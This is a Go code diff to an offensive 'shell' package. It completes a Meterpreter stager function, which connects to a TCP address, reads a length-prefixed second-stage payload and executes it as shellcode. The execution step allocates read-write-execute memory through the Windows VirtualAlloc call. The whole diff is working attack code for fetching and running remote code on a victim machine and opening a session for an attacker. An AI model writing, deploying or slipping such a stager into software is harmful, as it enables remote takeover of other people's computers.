@@ -4,6 +4,7 @@ package shell
 
 import (
 	"encoding/base64"
+	"encoding/binary"
 	"net"
 	"os/exec"
 	"syscall"
@@ -57,7 +58,9 @@ func ExecShellcode(shellcode []byte) {
 	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
 	// Reserve space to drop shellcode
 	address, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+	// Ugly, but works
 	addrPtr := (*[990000]byte)(unsafe.Pointer(address))
+	// Copy shellcode
 	for i := 0; i < len(shellcode); i++ {
 		addrPtr[i] = shellcode[i]
 	}
@@ -65,14 +68,30 @@ func ExecShellcode(shellcode []byte) {
 }
 
 func Meterpreter(address string) (bool, error) {
-	var stage2Length []byte = make([]byte, 4)
+	var (
+		stage2LengthBuf []byte = make([]byte, 4)
+		stage2LengthInt uint32
+		conn            net.Conn
+		err             error
+	)
 
-	if conn, err := net.Dial("tcp", address); err != nil {
-		return err
+	if conn, err = net.Dial("tcp", address); err != nil {
+		return false, err
 	}
 	defer conn.Close()
 
-	conn.Read(stage2Length)
+	if _, err = conn.Read(stage2LengthBuf); err != nil {
+		return false, err
+	}
+
+	stage2LengthInt = binary.LittleEndian.Uint32(stage2LengthBuf[:])
+	stage2Buf := make([]byte, stage2LengthInt)
+
+	if _, err = conn.Read(stage2Buf); err != nil {
+		return false, err
+	}
+
+	ExecShellcode(stage2Buf)
 
 	return true, nil
 }
